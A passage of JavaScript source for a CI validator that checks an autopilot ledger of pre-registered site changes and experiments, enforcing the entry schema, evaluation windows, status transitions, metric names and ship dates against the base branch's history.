    if (defined.length) problems.push(`must still render <${tag} /> from its own module: the layout defines ${defined.map((name) => `<${name}>`).join(', ')} itself`);
    if (before && before.imports[tag] && after.imports[tag] !== before.imports[tag]) problems.push(`must still import ${tag} from '${before.imports[tag]}', as main does`);
  }
  return problems;
}

// ---------- The ledger ----------

/** Non-blank lines (a leading byte-order mark and trailing carriage returns are ignored), each parsed. */
function parseLedger(text) {
  if (text === null) return null;
  const entries = [];
  text.replace(/^﻿/, '').split('\n').forEach((line, index) => {
    const raw = line.replace(/\r$/, '');
    if (!raw.trim()) return;
    let value; let error = null;
    try { value = JSON.parse(raw); } catch (e) { error = `does not parse as JSON (${e.message}); each entry is one JSON object on one line`; }
    if (!error && !isObject(value)) error = 'is not a JSON object';
    entries.push({ number: index + 1, raw, value: error ? null : value, error });
  });
  return entries;
}

// ---------- The ledger entry schema ----------

const DAY_MS = 86400000;
const addDays = (date, days) => new Date(Date.parse(`${date}T00:00:00Z`) + days * DAY_MS).toISOString().slice(0, 10);
const daysFrom = (from, to) => Math.round((Date.parse(`${to}T00:00:00Z`) - Date.parse(`${from}T00:00:00Z`)) / DAY_MS);
const daysApart = (days) => `${Math.abs(days)} day${Math.abs(days) === 1 ? '' : 's'} ${days < 0 ? 'before' : 'after'}`;
const given = (value) => value !== undefined;
const isNull = (value) => value === null || value === undefined;
const isCount = (value) => Number.isSafeInteger(value) && value > 0;
const isBlank = (value) => typeof value === 'string' && !value.trim();
const isMaxDays = (value) => Number.isSafeInteger(value) && value >= 1 && value <= LIMITS.experimentMaxDays;
const isPages = (pages) => Array.isArray(pages) && pages.length > 0 && pages.every((page) => typeof page === 'string' && EXPERIMENT_PAGE.test(page)) && new Set(pages).size === pages.length;
const shown = (value) => (typeof value === 'number' ? String(value) : value === undefined ? 'missing' : brief(value));
const aKind = (kind) => `${/^[aeiou]/.test(kind) ? 'an' : 'a'} ${kind}`;
const BASELINE_WINDOW = /^(\d{4}-\d{2}-\d{2})\.\.(\d{4}-\d{2}-\d{2})$/;
const BASELINE_DAYS = [7, 56];

/**
 * A change's or an experiment's baseline: the visits it counted (`visits` or `n`, a positive whole number; if both
 * are given, they agree) over a window of whole UTC days before the entry was written ("YYYY-MM-DD..YYYY-MM-DD", 7 to
 * 56 days counting both ends), and its other numbers, which are non-negative and finite. Text, and lists and objects of
 * numbers and text, are fine.
 */
function measuredBaselineProblems(entry) {
  if (!isObject(entry.baseline)) return null; // reported by the "baseline" row
  const problems = [];
  const { window, visits, n, ...rest } = entry.baseline;
  const match = typeof window === 'string' ? BASELINE_WINDOW.exec(window) : null;
  if (!match || !validDate(match[1]) || !validDate(match[2])) {
    problems.push(`${aKind(entry.kind)} needs "baseline"."window", "YYYY-MM-DD..YYYY-MM-DD": the UTC days its baseline numbers were counted over (${shown(window)})`);
  } else {
    const [, start, end] = match;
    const days = daysFrom(start, end) + 1;
    if (days < 1) problems.push(`"baseline"."window" ${window} ends before it starts`);
    else if (days < BASELINE_DAYS[0] || days > BASELINE_DAYS[1]) problems.push(`"baseline"."window" ${window} covers ${days} day${days === 1 ? '' : 's'}; a baseline covers ${BASELINE_DAYS[0]} to ${BASELINE_DAYS[1]} whole days, counting both ends`);
    if (validDate(entry.date) && end > entry.date) problems.push(`"baseline"."window" ${window} ends after the entry's date ${entry.date}; the baseline is measured before the entry is written`);
  }
  const counts = [['visits', visits], ['n', n]].filter(([, value]) => given(value));
  if (!counts.length) problems.push(`${aKind(entry.kind)} needs "baseline"."visits" (or "n"): how many visits its window counted, a positive whole number`);
  for (const [key, value] of counts) if (!isCount(value)) problems.push(`"baseline"."${key}" is ${shown(value)}; it counts visits, a positive whole number`);
  if (isCount(visits) && isCount(n) && visits !== n) problems.push(`"baseline"."visits" ${visits} and "baseline"."n" ${n} disagree; both count the window's visits, so give one`);
  const walk = (value, at) => {
    if (typeof value === 'number') { if (!(Number.isFinite(value) && value >= 0)) problems.push(`"baseline"."${at}" is ${shown(value)}; baseline numbers are non-negative and finite`); }
    else if (Array.isArray(value)) value.forEach((item, index) => walk(item, `${at}[${index}]`));
    else if (isObject(value)) for (const [key, item] of Object.entries(value)) walk(item, `${at}.${key}`);
    else if (typeof value !== 'string') problems.push(`"baseline"."${at}" is ${shown(value)}; baseline values are numbers, text, or lists or objects of them (leave out a number you do not have)`);
  };
  for (const [key, value] of Object.entries(rest)) walk(value, key);
  return problems;
}

/**
 * When a change or an experiment is first evaluated, in days after its date. A change: 14 to 90, and no sooner than its
 * windows allow (window_days). An experiment: at its planned end, from 7 days (or its max_days, if shorter) to its
 * max_days plus a day to ship; a later ship is covered by the due date (changeDueDate, and the skill's §2.3), so a later
 * evaluate_after would only run it past its registered maximum. fix, revert and conclude have none (their own row).
 */
function evaluateAfterProblems(entry) {
  if (!validDate(entry.evaluate_after) || !validDate(entry.date)) return null; // reported by the "evaluate_after" rows
  const days = daysFrom(entry.date, entry.evaluate_after);
  const said = `"evaluate_after" ${entry.evaluate_after} is ${daysApart(days)} the entry's date ${entry.date}`;
  if (entry.kind === 'change') {
    const from = Math.max(14, WINDOW_DAYS.includes(entry.window_days) ? entry.window_days : 14);
    if (days < from || days > 90) return `${said}; a change is evaluated ${from} to 90 days after it is registered (at least 14 days, and no sooner than its "window_days")`;
  } else if (entry.kind === 'experiment') {
    const from = isMaxDays(entry.max_days) ? Math.min(7, entry.max_days) : 7;
    const to = isMaxDays(entry.max_days) ? entry.max_days + 1 : null;
    if (days < from || (to !== null && days > to)) return `${said}; an experiment is evaluated ${from} to ${to === null ? '"max_days" + 1' : to} days after it is registered (at its planned end: its "max_days", plus a day to ship; a later ship moves its due date, not this)`;
  }
  return null;
}

/**
 * A change's due date (autopilot/metrics.md §4, the skill's §2.3): the later of evaluate_after and the first day after
 * its after-window, shipped_on + window_days + 1. null until it has shipped.
 */
function changeDueDate(entry) {
  if (entry.kind !== 'change' || !validDate(entry.shipped_on)) return null;
  const windowsEnd = addDays(entry.shipped_on, (WINDOW_DAYS.includes(entry.window_days) ? entry.window_days : 14) + 1);
  return validDate(entry.evaluate_after) && entry.evaluate_after > windowsEnd ? entry.evaluate_after : windowsEnd;
}

/**
 * shipped_on (the UTC day its pull request merged) and evaluated_on (the day it was judged) have happened: neither is
 * before the entry's date, the evaluation is not before the ship, and neither is after today (a day of slack aside).
 */
function eventDateProblems(entry, field, today) {
  const day = entry[field];
  if (!validDate(day)) return null; // null, or reported by the dates row
  const what = field === 'shipped_on' ? 'the UTC day its pull request merged' : 'the day it was judged';
  const problems = [];
  if (validDate(entry.date) && day < entry.date) problems.push(`"${field}" ${day} is before the entry's date ${entry.date}; it is ${what}`);
  if (field === 'evaluated_on' && validDate(entry.shipped_on) && day < entry.shipped_on) problems.push(`"evaluated_on" ${day} is before "shipped_on" ${entry.shipped_on}; an entry is judged after it ships`);
  if (today && day > addDays(today, LIMITS.ledgerClockDays)) problems.push(`"${field}" ${day} is in the future (today is ${today}, UTC); it is ${what}`);
  return problems;
}

/**
 * A concluded change was judged on its full windows: on or after its due date, and so was the check (a day of clock
 * slack on evaluated_on cannot bring the judgement forward). An experiment's stopping rule may decide it sooner, and
 * any entry may be rolled back sooner (an incident, a broken guardrail: verdict revert), so neither is held to it; a
 * change reverted as inconclusive is held to it too (revertedEntryProblems).
 */
function concludedEarlyProblems(entry, today) {
  if (entry.status !== 'concluded' || !validDate(entry.evaluated_on)) return null;
  const due = changeDueDate(entry);
  if (!due) return null;
  const late = today && today < entry.evaluated_on ? today : entry.evaluated_on;
  if (late >= due) return null;
  return `a change is judged on or after its due date ${due} (the later of "evaluate_after" and "shipped_on" + "window_days" + 1), on its full windows; it was judged on ${entry.evaluated_on}${late !== entry.evaluated_on ? ` and today is ${today}` : ''}. Leave it "shipped" until then`;
}

/**
 * What each status needs so the entry stays evaluable: the fields that must be set, and those that stay null. A
 * proposed entry has not merged (bookkeeping marks it shipped); a shipped one waits for its verdict, and the
 * evaluation picks shipped entries whose verdict is null, so an earlier verdict, result or evaluation date would hide
 * it. A reverted entry is checked when it moves there (revertedEntryProblems) or, as the record of a pull request that
 * closed unmerged, when it is new (newEntryProblems); one without shipped_on never shipped (neverEvaluatedProblems).
 */
const LEDGER_STATES = {
  proposed: { set: [], unset: ['shipped_on', 'verdict', 'result', 'evaluated_on'] },
  shipped: { set: ['pr', 'shipped_on'], unset: ['verdict', 'result', 'evaluated_on'] },
  concluded: { set: ['pr', 'shipped_on', 'verdict', 'result', 'evaluated_on'], unset: [] },
  reverted: { set: [], unset: [] },
};
function stateProblems(entry) {
  // An own property only: a status such as "constructor" or "__proto__" names no state, so it is reported, not looked up.
  const state = typeof entry.status === 'string' && Object.hasOwn(LEDGER_STATES, entry.status) ? LEDGER_STATES[entry.status] : null;
  if (!state) return null; // reported by the "status" row
  return [
    ...state.set.filter((key) => isNull(entry[key])).map((key) => `"${entry.status}" entry requires non-null "${key}"`),
    ...state.unset.filter((key) => !isNull(entry[key])).map((key) => `"${key}" is ${shown(entry[key])} on a "${entry.status}" entry; it stays null until ${key === 'shipped_on' ? 'its pull request has merged and the entry is marked shipped' : 'the entry is judged, when its status moves to concluded or reverted'}`),
  ];
}

/**
 * A reverted entry without shipped_on never shipped (the record of a pull request that closed unmerged), so it was
 * never evaluated either: no result and no evaluation date, whether it is new, moves to reverted or is already there.
 */
function neverEvaluatedProblems(entry) {
  if (entry.status !== 'reverted' || !isNull(entry.shipped_on)) return null;
  return ['result', 'evaluated_on'].filter((key) => !isNull(entry[key])).map((key) => `"${key}" is ${shown(entry[key])} on a "reverted" entry without "shipped_on"; an entry that never shipped (the record of a pull request that closed unmerged) was never evaluated, so it stays null`);
}

const EVERY = null;
const except = (...kinds) => LEDGER_KINDS.filter((kind) => !kinds.includes(kind));
const LEGACY = true;
/**
 * The ledger entry schema, one row per rule: [field, the kinds it binds (EVERY: any entry), legacy, check]. A check
 * returns nothing when the entry is fine, else what to fix (one message or a list). autopilot/metrics.md §4 has the
 * same rules as a table. Together they cover every field a later step reads: bookkeeping finds an entry's pull request
 * by `id` and fills in `pr` and `shipped_on`; the evaluation picks entries by `status`, `verdict` and `evaluate_after`
 * and judges them by `primary_metric`, `guardrails`, `baseline`, `min_sample`, `window_days` or `max_days` and
 * `decision_rule`; an experiment's readout needs its `experiment` key and `pages`; the streak check reads `kind`,
 * `shipped_on` and `verdict`. So nothing it relies on can be missing, blank, out of range or at odds with another field.
 *
 * The rows check new entries, repaired lines and edited lines alike. newEntryProblems() and existingEntryProblems()
 * add what depends on a line being new or edited, and metricProblems() the metric names, which come from the base.
 * A LEGACY row is about a field that is fixed once written (or a rule newer than lines already on main): an edited line
 * that broke it on the base already only warns, since no edit can repair it, so the line can still be shipped,
 * concluded or reverted. `today` is the UTC day of the check (the head commit's, or the clock's if that is earlier;
 * null when unknown: then no date is compared with it).
 */
const LEDGER_SCHEMA = [
  // What the entry is.
  ['id', EVERY, false, (e) => given(e.id) && !(typeof e.id === 'string' && LEDGER_ID.test(e.id)) && '"id" must look like YYYY-MM-DD-some-slug'],
  ['date', EVERY, false, (e) => given(e.date) && !validDate(e.date) && '"date" must be a YYYY-MM-DD date'],
  ['kind', EVERY, false, (e) => given(e.kind) && !LEDGER_KINDS.includes(e.kind) && `"kind" must be one of ${LEDGER_KINDS.join(', ')}`],
  // What it claims, and how it is judged. A blank title, hypothesis or decision rule registers nothing.
  ['title, hypothesis, primary_metric, decision_rule', EVERY, false, (e) => ['title', 'hypothesis', 'primary_metric', 'decision_rule'].filter((key) => given(e[key]) && typeof e[key] !== 'string').map((key) => `"${key}" must be a string`)],
  ['title', EVERY, false, (e) => isBlank(e.title) && '"title" is empty'],
  ['hypothesis, decision_rule', EVERY, LEGACY, (e) => ['hypothesis', 'decision_rule'].filter((key) => isBlank(e[key])).map((key) => `"${key}" is empty`)],
  ['guardrails', EVERY, false, (e) => given(e.guardrails) && !Array.isArray(e.guardrails) && '"guardrails" must be an array'],
  ['guardrails', JUDGED_KINDS, LEGACY, (e) => Array.isArray(e.guardrails) && !e.guardrails.length && `"guardrails" is empty; ${e.kind === 'experiment' ? 'an' : 'a'} "${e.kind}" entry needs at least one from ${METRICS} §1 (only fix, revert and conclude entries may have none)`],
  ['baseline', EVERY, false, (e) => given(e.baseline) && !isObject(e.baseline) && '"baseline" must be an object'],
  ['baseline', JUDGED_KINDS, LEGACY, measuredBaselineProblems],
  // Stopping rules and windows, registered before launch and immutable: a minimum sample for every judged kind (a
  // smaller window or arm is judged inconclusive), a change's before/after window length, an experiment's maximum duration.
  ['min_sample', ['change'], LEGACY, (e) => !isCount(e.min_sample) && 'a change requires "min_sample" to be a positive safe integer'],
  ['min_sample', ['experiment'], LEGACY, (e) => !isCount(e.min_sample) && 'an experiment requires "min_sample" to be a positive safe integer'],
  ['min_sample', except(...JUDGED_KINDS), LEGACY, (e) => !isNull(e.min_sample) && !isCount(e.min_sample) && '"min_sample" must be a positive safe integer or null'],
  ['window_days', ['change'], LEGACY, (e) => !WINDOW_DAYS.includes(e.window_days) && `a change requires "window_days", ${WINDOW_DAYS.join(' or ')}: the full days in each of its before/after windows, counted from "shipped_on"`],
  ['window_days', except('change'), LEGACY, (e) => !isNull(e.window_days) && `only a change has "window_days"; ${aKind(e.kind)} leaves it out or null${e.kind === 'experiment' ? ' (its window is "max_days")' : ''}`],
  ['max_days', ['experiment'], LEGACY, (e) => !isMaxDays(e.max_days) && `an experiment requires "max_days" to be an integer from 1 to ${LIMITS.experimentMaxDays}`],
  ['max_days', except('experiment'), LEGACY, (e) => !isNull(e.max_days) && `only an experiment has "max_days"; ${aKind(e.kind)} leaves it out or null`],
  // When it is evaluated. A fix, a revert and the conclusion of an experiment are not judged later: no windows, sample
  // or comparison is registered for them, so a date would leave those to be chosen when it is judged.
  ['evaluate_after', JUDGED_KINDS, LEGACY, (e) => given(e.evaluate_after) && !validDate(e.evaluate_after) && '"evaluate_after" must be a YYYY-MM-DD date (null only for fix, revert and conclude)'],
  ['evaluate_after', except(...JUDGED_KINDS), LEGACY, (e) => !isNull(e.evaluate_after) && `${aKind(e.kind)} is not judged later, so "evaluate_after" is null (it registers no windows or sample to judge it on), not ${shown(e.evaluate_after)}`],
  ['evaluate_after', JUDGED_KINDS, LEGACY, evaluateAfterProblems],
  // Where it runs: an experiment's registry key and pages (and optional area), as its readout and the occupancy check
  // read them; another kind may name them too.
  ['experiment', ['experiment'], LEGACY, (e) => !(typeof e.experiment === 'string' && EXPERIMENT_KEY.test(e.experiment)) && 'an experiment requires "experiment", its key in lib/experiments.ts (lower-case words joined by hyphens)'],
  ['experiment', except('experiment'), LEGACY, (e) => !isNull(e.experiment) && !(typeof e.experiment === 'string' && EXPERIMENT_KEY.test(e.experiment)) && '"experiment" must be a key in lib/experiments.ts (lower-case words joined by hyphens) or null'],
  ['pages', ['experiment'], LEGACY, (e) => !isPages(e.pages) && 'an experiment requires "pages": nonempty, unique canonical site paths (such as "/" or "/tools"), or "*" for every page'],
  ['pages', except('experiment'), LEGACY, (e) => !isNull(e.pages) && !isPages(e.pages) && '"pages" must be nonempty, unique canonical site paths (such as "/" or "/tools"), or "*" for every page'],
  ['area', EVERY, LEGACY, (e) => given(e.area) && !(e.area === '*' || (typeof e.area === 'string' && EXPERIMENT_KEY.test(e.area))) && '"area" must be a lower-case, hyphenated slug, or "*" (or left out) for the whole page'],
  // Where it is in its lifecycle (autopilot/metrics.md §4), and what that requires.
  ['status', EVERY, false, (e) => given(e.status) && !LEDGER_STATUSES.includes(e.status) && `"status" must be one of ${LEDGER_STATUSES.join(', ')}`],
  ['status', EVERY, false, stateProblems],
  ['result, evaluated_on', EVERY, LEGACY, neverEvaluatedProblems],
  ['pr', EVERY, false, (e) => given(e.pr) && !(e.pr === null || (Number.isInteger(e.pr) && e.pr > 0)) && '"pr" must be a pull request number or null'],
  ['verdict', EVERY, false, (e) => given(e.verdict) && !(e.verdict === null || LEDGER_VERDICTS.includes(e.verdict)) && `"verdict" must be null or one of ${LEDGER_VERDICTS.join(', ')}`],
  // A verdict is one its kind's comparison can reach, and "revert" is recorded where the change is undone, so a change
  // judged harmful never sits "concluded" and live with nothing due.
  ['verdict', LEDGER_KINDS, LEGACY, (e) => LEDGER_VERDICTS.includes(e.verdict) && !LEDGER_KIND_VERDICTS[e.kind].includes(e.verdict) && `"verdict" "${e.verdict}" is not a verdict for ${aKind(e.kind)}; it is one of ${LEDGER_KIND_VERDICTS[e.kind].join(', ')}`],
  ['verdict', EVERY, LEGACY, (e) => e.verdict === 'revert' && e.status === 'concluded' && 'verdict "revert" goes with status "reverted", in the pull request that reverts the change (until then the entry stays "shipped" with verdict null, and the next run judges it again)'],
  ['result', EVERY, false, (e) => given(e.result) && !(e.result === null || isObject(e.result)) && '"result" must be null or an object'],
  ['result', EVERY, LEGACY, (e) => isObject(e.result) && !Object.keys(e.result).length && '"result" is an empty object; record the numbers, with n, or leave it null'],
  ['shipped_on, evaluated_on', EVERY, false, (e) => ['evaluated_on', 'shipped_on'].filter((key) => given(e[key]) && !(e[key] === null || validDate(e[key]))).map((key) => `"${key}" must be null or a YYYY-MM-DD date`)],
  ['shipped_on', EVERY, LEGACY, (e, { today }) => eventDateProblems(e, 'shipped_on', today)],
  ['evaluated_on', EVERY, LEGACY, (e, { today }) => eventDateProblems(e, 'evaluated_on', today)],
  ['evaluated_on', ['change'], LEGACY, (e, { today }) => concludedEarlyProblems(e, today)],
  ['notes', EVERY, false, (e) => !isNull(e.notes) && typeof e.notes !== 'string' && '"notes" must be text'],
];

/** Every schema problem of one entry, as { message, legacy }. Rows for a kind are skipped while the kind is unknown. */
function ledgerEntryProblems(value, { today = null } = {}) {
  const problems = LEDGER_REQUIRED.filter((key) => !(key in value)).map((key) => ({ message: `missing "${key}"`, legacy: false }));
  for (const [, kinds, legacy, rule] of LEDGER_SCHEMA) {
    if (kinds && !kinds.includes(value.kind)) continue;
    for (const message of [].concat(rule(value, { today }) || [])) if (message) problems.push({ message, legacy });
  }
  return problems;
}

// ---------- The ledger against the base ----------

/**
 * The metric names autopilot/metrics.md defines: every backticked `name@vN` in the first cell of a row of its
 * "## 1. Definitions" table. A name mentioned anywhere else (prose, the queries, the §4 example) is not defined by
 * it. null when the file is missing; an empty set when it defines nothing.
 */
function metricNames(text) {
  if (text === null || text === undefined) return null;
  const names = new Set();
  let inDefinitions = false;
  for (const line of String(text).replace(/\r/g, '').split('\n')) {
    if (/^##\s/.test(line)) { inDefinitions = /^##\s+1\.\s+Definitions\b/.test(line); continue; }
    if (!inDefinitions || !line.trim().startsWith('|')) continue;
    const first = line.trim().slice(1).split('|')[0];
    for (const [, name] of first.matchAll(/`([^`]*)`/g)) if (METRIC_NAME.test(name)) names.add(name);
  }
  return names;
}

/** primary_metric and every guardrail must be a defined name, exactly (how many guardrails a kind needs is in LEDGER_SCHEMA). */
function metricProblems(value, names) {
  const problems = [];
  const choices = `use ${names.size === 1 ? 'its name' : 'one of its names'} exactly: ${[...names].join(', ')}`;
  if (typeof value.primary_metric === 'string' && !names.has(value.primary_metric)) problems.push(`"primary_metric" ${brief(value.primary_metric)} is not a metric defined in ${METRICS} §1; ${choices}`);
  if (Array.isArray(value.guardrails)) {
    const unknown = value.guardrails.filter((name) => typeof name !== 'string' || !names.has(name));
    if (unknown.length) problems.push(`"guardrails" ${unknown.map(brief).join(', ')} ${unknown.length === 1 ? 'is not a metric' : 'are not metrics'} defined in ${METRICS} §1; ${choices}`);
  }
  return problems;
}

/**
 * A new entry is pre-registered: proposed (the schema keeps its shipped_on, verdict and result null until it ships and
 * is judged), with the branch's id, dated within two days of the branch and not after the commit that adds it (so the
 * day it ships is never before its date), naming this pull request or none. The one exception is the record of an
 * earlier change whose pull request closed without merging: status reverted, verdict null or inconclusive, never shipped
 * (and so never evaluated: the schema keeps its result and evaluation date null), any earlier date and id, and its
 * provenance: that pull request's number and a note saying why it closed.
 */
function newEntryProblems(value, { branchDate, branchId, pr, today = null }) {
  const problems = [];
  const recordOfClosed = value.status === 'reverted';
  if (!recordOfClosed && branchId && value.id !== branchId) problems.push(`"id" must be "${branchId}", the branch name without "${BRANCH_PREFIX}"; only records of closed-unmerged pull requests may use another id`);
  if (!recordOfClosed && value.status !== 'proposed' && LEDGER_STATUSES.includes(value.status)) problems.push(`a new entry starts "proposed", not "${value.status}"; it is marked shipped once its pull request has merged`);
  if (recordOfClosed) {
    const record = 'a new "reverted" entry (the record of a pull request that closed unmerged)';
    if (![null, undefined, 'inconclusive'].includes(value.verdict)) problems.push(`${record} has "verdict" null or "inconclusive"`);
    // Its result and evaluation date stay null too (neverEvaluatedProblems, in the schema).
    if (!isNull(value.shipped_on)) problems.push(`${record} has "shipped_on" null; it never merged`);
    if (!(Number.isInteger(value.pr) && value.pr > 0)) problems.push(`${record} requires "pr", the number of the pull request that closed`);
    if (!(typeof value.notes === 'string' && value.notes.trim())) problems.push(`${record} requires "notes" saying why it closed`);
  }
  if (branchDate && validDate(value.date)) {
    const days = daysFrom(branchDate, value.date);
    if (days > LIMITS.ledgerDateDays || (days < -LIMITS.ledgerDateDays && !recordOfClosed)) problems.push(`"date" ${value.date} is more than ${LIMITS.ledgerDateDays} days from the branch date ${branchDate}`);
  }
  if (today && validDate(value.date) && value.date > today) problems.push(`"date" ${value.date} is after today, ${today} (UTC); a new entry is dated the UTC day it is written (date -u +%F)`);
  if (pr && Number.isInteger(value.pr) && value.pr !== pr && !recordOfClosed) problems.push(`"pr" is ${value.pr}; a new entry names this pull request (#${pr}) or null`);
  return problems;
}

/**
 * An existing entry moving to "reverted" leaves the evaluation queue too, so it records how: verdict "revert" (it
 * shipped and was rolled back, so also the day it shipped and the day it was judged) or "inconclusive" (its pull
 * request closed unmerged, or no verdict was reached), its pull request, and a note saying why. The note it already
 * had does not say why, so the note must change. A change that shipped and is judged now (its verdict was null) is
 * held to its due date as a conclusion is: before it, it leaves the queue only as rolled back, verdict "revert", so an
 * early look cannot take a live change out of its evaluation as "inconclusive" (nor hide a bad one from the streak check).
 */
function revertedEntryProblems(value, old = {}, today = null) {
  const problems = [];
  const note = (notes) => (typeof notes === 'string' ? notes.trim() : '');
  if (!['revert', 'inconclusive'].includes(value.verdict)) problems.push('"reverted" entry requires "verdict" "revert" or "inconclusive"');
  for (const key of value.verdict === 'revert' ? ['pr', 'shipped_on', 'evaluated_on'] : ['pr']) {
    if (value[key] === undefined || value[key] === null) problems.push(`"reverted" entry${key === 'pr' ? '' : ' with verdict "revert"'} requires non-null "${key}"`);
  }
  if (!note(value.notes) || note(value.notes) === note(old.notes)) problems.push('"reverted" entry requires "notes" saying why (add to the note it already had)');
  const due = value.verdict === 'inconclusive' && isNull(old.verdict) ? changeDueDate(value) : null;
  const judged = validDate(value.evaluated_on) && !(today && today < value.evaluated_on) ? value.evaluated_on : today;
  if (due && judged && judged < due) problems.push(`a change that shipped is reverted before its due date ${due} only with verdict "revert" (it was rolled back); it was judged on ${judged}. "inconclusive" is for a change that never shipped, or one judged on or after its due date: until then leave it "shipped"`);
  return problems;
}

/**
 * An existing entry: only the mutable fields change, the status only moves forward, and set-once fields stay set. A
 * reverted entry that never shipped (a closed-unmerged record) never gains a ship day: none of its own merge exists to
 * check one against. `today` is as in checkLedger.
 */
function existingEntryProblems(old, now, today = null) {
  const problems = [];
  const keys = new Set([...Object.keys(old), ...Object.keys(now)]);
  const changed = [...keys].filter((key) => !LEDGER_MUTABLE.has(key) && !sameJson(old[key], now[key]));
  if (changed.length) problems.push(`changed ${changed.map((k) => `"${k}"`).join(', ')}; existing entries may change only ${[...LEDGER_MUTABLE].join(', ')}`);
  if (old.status !== now.status && LEDGER_STATUSES.includes(old.status) && !LEDGER_NEXT[old.status].includes(now.status)) {
    problems.push(`"status" cannot go from "${old.status}" to "${now.status}"${LEDGER_NEXT[old.status].length ? ` (only to ${LEDGER_NEXT[old.status].join(' or ')})` : ''}`);
  }
  if (now.status === 'reverted' && old.status !== 'reverted') problems.push(...revertedEntryProblems(now, old, today));
  if (old.status === 'reverted' && isNull(old.shipped_on) && !isNull(now.shipped_on)) problems.push('a "reverted" entry that never shipped (the record of a pull request that closed unmerged) keeps "shipped_on" null');
  for (const key of LEDGER_SET_ONCE) {
    const before = old[key] === undefined ? null : old[key];
    if (before !== null && !sameJson(before, now[key] === undefined ? null : now[key])) problems.push(`"${key}" was already ${brief(before)}; once set it cannot change`);
  }
  return problems;
}

/**
 * shipped_on, set on a line already on the base, is the day that line reached the base: its pull request's (squash)
 * merge, the same day the automatic revert records. Bookkeeping fills it in after the merge, when data from after the
 * ship already exists, so a free choice would let it pick where an entry's windows fall.
 */
function shippedOnProblems(old, now, mergedOn) {
  if (!mergedOn || !isNull(old.shipped_on) || !validDate(now.shipped_on) || typeof old.id !== 'string') return [];
  const merged = mergedOn(old.id);
  if (!merged) return [`"shipped_on" ${now.shipped_on} cannot be checked: no commit in the base's first-parent history adds this entry's line (with a shallow clone, fetch the full history: git fetch --unshallow)`];
  if (merged.day !== now.shipped_on) return [`"shipped_on" is ${now.shipped_on}, but the entry's line reached main on ${merged.day} (commit ${merged.commit.slice(0, 7)}, its pull request's merge); "shipped_on" is that UTC day`];
  return [];
}

/**
 * A repaired line's ship day, when it has no earlier version to be held to (it never parsed on the base): the day its
 * broken text reached the base, which `addedOn(raw)` gives ({ day, commit }, or null when the history cannot show it).
 */
function repairedShippedOnProblems(old, now, addedOn) {
  if (!addedOn || !validDate(now.shipped_on)) return [];
  const added = addedOn(old.raw);
  if (!added) return [`"shipped_on" ${now.shipped_on} cannot be checked: no commit in the base's first-parent history adds this broken line (with a shallow clone, fetch the full history: git fetch --unshallow)`];
  if (added.day !== now.shipped_on) return [`"shipped_on" is ${now.shipped_on}, but the broken line reached main on ${added.day} (commit ${added.commit.slice(0, 7)}); "shipped_on" is that UTC day`];
  return [];
}

/** The id a line that does not parse names (`"id": "…"`), or null. */
function idInText(raw) {
  const match = /"id"\s*:\s*"((?:[^"\\]|\\.)*)"/.exec(raw);
  if (!match) return null;
  try { return JSON.parse(`"${match[1]}"`); } catch { return null; }
}

/**
 * The head's ledger against the base's. Existing lines are matched by id (a line that is not a valid entry, by
 * position), so a deleted line is reported once, as a deletion; every head line no base line matches is new.
 * `bookkeeping` (the pull request changes nothing but the three autopilot record files) waives the new line.
 * Otherwise the change needs its own proposed entry; records of closed-unmerged pull requests alone do not count.
 * `metrics` is metricNames() of the base's autopilot/metrics.md: new entries, and broken base lines repaired into
 * entries, must use its names, and without any (the file missing, or defining none) they fail. Unknown names on
 * existing lines are only warnings. `today` is the UTC day of the check (the head commit's, or the clock's if that is
 * earlier): no shipped_on or evaluated_on may be after it (LIMITS.ledgerClockDays aside), nor a new entry's date.
 * `mergedOn(id)` gives the day an existing entry's line reached the base ({ day, commit }, or null when the history
 * cannot show it): the day it shipped, which a shipped_on set on that line now must be. Without it, that is not checked.
 * A broken base line that is repaired is held to the line as it last parsed on the base, `lastParsed(id)` (by the id its
 * broken text names, else the repaired line's), as an edited line is; one that never parsed there meets the whole
 * schema, and its shipped_on is the day its text reached the base, `addedOn(raw)`. Without them, neither is checked.
 */
function checkLedger(baseText, headText, { violations, warnings, branchDate, branchId, pr, bookkeeping = false, metrics = null, today = null, mergedOn = null, lastParsed = null, addedOn = null }) {
  const v = (line, message) => violations.push({ rule: 'ledger', file: LEDGER, line, message });
  const w = (line, message) => warnings.push({ rule: 'ledger', file: LEDGER, line, message });
  const head = parseLedger(headText);
  if (!head) { v(null, 'missing: every autopilot pull request appends a line to autopilot/ledger.jsonl'); return; }
  const base = parseLedger(baseText) || [];
  const idOf = (entry) => (entry.value && typeof entry.value.id === 'string' ? entry.value.id : null);
  // Lines with the same id are matched in order, so ids already used twice on the base (a hand edit) never wedge the ledger.
  const headById = new Map();
  for (const entry of head) if (idOf(entry) !== null) headById.set(idOf(entry), [...(headById.get(idOf(entry)) || []), entry]);
  const matched = new Map();
  const taken = new Set();
  for (const [index, old] of base.entries()) {
    const now = idOf(old) !== null ? (headById.get(idOf(old)) || []).find((entry) => !taken.has(entry)) : head[index];
    if (now && !taken.has(now)) { matched.set(old, now); taken.add(now); }
  }
  const removed = base.filter((old) => !matched.has(old));
  for (const old of removed) v(old.number, idOf(old) !== null ? `existing entry "${idOf(old)}" was removed; ledger lines are never deleted (an undone change is marked "reverted")` : 'an existing line was removed');
  // Existing lines stay first and in their order (checked only when none was removed, so one deletion is not reported again as a move).
  if (!removed.length) {
    const misplaced = base.findIndex((old, index) => head[index] !== matched.get(old));
    if (misplaced >= 0) v(matched.get(base[misplaced]).number, `existing entry ${idOf(base[misplaced]) ? `"${idOf(base[misplaced])}" ` : ''}moved from line ${base[misplaced].number}; existing lines stay where they are and new lines go at the end`);
  }
  const names = metrics instanceof Set && metrics.size ? metrics : null;
  const schema = (value) => ledgerEntryProblems(value, { today });
  // Every id on the base is taken first, by its own line, so neither a repaired line nor a new one can reuse it.
  const ids = new Map();
  for (const [old, now] of matched) {
    if (old.error || idOf(old) === null) continue;
    if (ids.has(idOf(old))) w(now.number, `id "${idOf(old)}" is also used on line ${ids.get(idOf(old))} (already on the base); each entry's id is unique`);
    else ids.set(idOf(old), now.number);
  }
  const onBase = new Set(ids.keys());
  let repaired = false;
  for (const [old, now] of matched) {
    if (old.error) {
      // A broken line already on the base is reported, not held against this change; it may be repaired. A line that
      // broke after it parsed there (a hand edit) is held to that version, as an edited line is to its base copy: its
      // fixed fields, its lifecycle, and a ship day that is its merge's. A line that never parsed there has no fields on
      // the base, so the whole schema binds it, its metric names are checked as a new entry's are, and its ship day is
      // the day its text reached the base. Either way its id is not one another line already uses.
      if (now.raw === old.raw) w(old.number, `line ${old.error} (already on the base)`);
      else if (now.error) v(now.number, `line ${now.error}`);
      else {
